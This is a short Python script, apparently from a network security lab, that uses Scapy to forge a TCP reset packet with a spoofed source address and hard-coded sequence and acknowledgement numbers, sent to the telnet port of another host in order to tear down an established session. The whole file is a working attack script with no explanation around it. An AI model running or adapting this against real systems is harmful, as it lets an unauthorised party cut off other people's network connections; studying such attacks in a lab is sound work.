#!/usr/bin/env python3
from scapy.all import *
ip = IP(src="10.9.0.7", dst="10.9.0.5")
tcp = TCP(sport=36932, dport=23, flags="R", seq=2120983059, ack=268914387)
pkt = ip/tcp
ls(pkt)
send(pkt,verbose=0)

